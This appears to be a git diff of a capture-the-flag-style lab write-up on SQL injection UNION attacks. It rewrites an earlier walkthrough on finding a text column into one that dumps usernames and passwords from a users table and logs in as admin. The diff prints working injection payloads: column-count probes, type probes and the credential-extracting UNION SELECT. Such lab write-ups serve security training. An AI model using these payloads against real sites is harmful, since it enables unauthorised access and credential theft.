@@ -1,33 +1,33 @@
 
-### SQL injection UNION attack, finding a column containing text : PRACTITIONER
+### SQL injection UNION attack, retrieving data from other tables : PRACTITIONER
 
 ---
 
-> Since the `Accessories` query parameter is vulnerable to SQLi, we inject all our payloads there.
+The `category` query parameter is vulnerable to SQL injection.
+- We will use a `UNION` based attack.
 
-> Get the number of columns using the `order by` technique. Keep increasing order by index until an error is produced.
+##### 1. Get the number of columns:
 ```
-Accessories' ORDER BY 4
+' UNION SELECT NULL, NULL--
 ```
-> Number of columns is 3 since we got the error at 4.
+- They are 2, as 3 gets an error.
 
-> To check which column of the three has type string use this payload with 3 NULLs for the 3 columns.
+##### 2. Get the data types
 ```
-' UNION SELECT NULL, NULL, NULL--
+' UNION SELECT 'a', NULL--
+' UNION SELECT NULL, 'a'--
 ```
-> Switch each one with a string and try. Errors mean that they are not the correct data type.
+- We need strings to get usernames and passwords. Both work, hence both are strings.
 
-> The second column is of type string as the website returns a response that isn't an error. The payload used:
-```
-' UNION SELECT NULL, 'a', NULL --
-```
+##### 3. Perform an Injection
 
-> Now we know which column is text. We need to retrieve the value `EoNl2q` from the database.
-> So we modify the above query to be:
+Next use this same payload but choose username and password fields from the users table.
 ```
-' UNION SELECT NULL, 'EoNI2q', NULL --
+' UNION SELECT username, password FROM users--
 ```
 
-> An extra row is output with the wanted data.
+![userandpass](./screenshots/adminsql.png)
+
+Now we can login as admin and the lab is complete.
 
 ---
